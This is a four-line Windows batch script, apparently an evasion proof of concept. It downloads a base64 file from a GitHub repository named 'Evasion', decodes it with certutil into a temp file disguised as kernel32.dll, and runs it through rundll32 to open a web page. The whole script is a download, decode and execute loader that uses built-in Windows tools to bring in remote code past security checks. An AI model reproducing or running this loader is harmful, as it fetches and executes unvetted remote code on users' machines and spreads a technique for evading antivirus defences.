@echo off
curl -s https://raw.githubusercontent.com/FabFromTheSnow/Evasion/main/dll.txt > "%temp%\dll.txt"
certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
rundll32.exe "%temp%\kernel32.dll",ShellExecuteA 0 "open" "http://www.openai.com" NULL NULL SW_SHOWNORMAL
